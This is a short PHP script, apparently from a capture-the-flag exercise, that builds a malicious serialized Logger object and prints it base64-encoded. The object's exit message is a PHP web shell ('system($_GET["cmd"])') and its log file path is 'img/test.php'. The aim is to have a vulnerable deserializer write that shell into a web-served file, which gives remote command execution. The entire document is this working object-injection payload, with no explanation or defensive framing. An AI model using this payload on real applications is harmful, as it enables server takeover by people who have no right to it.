<?php
class Logger
{
    private $logFile;
    private $initMsg;
    private $exitMsg;

    function __construct()
    {
        // initialise variables
        $this->initMsg = "foo";
        $this->exitMsg = '<?php system($_GET["cmd"]) ?>';
        $this->logFile = "img/test.php";
    }
}

$log = new Logger();
print base64_encode(serialize($log))."\n";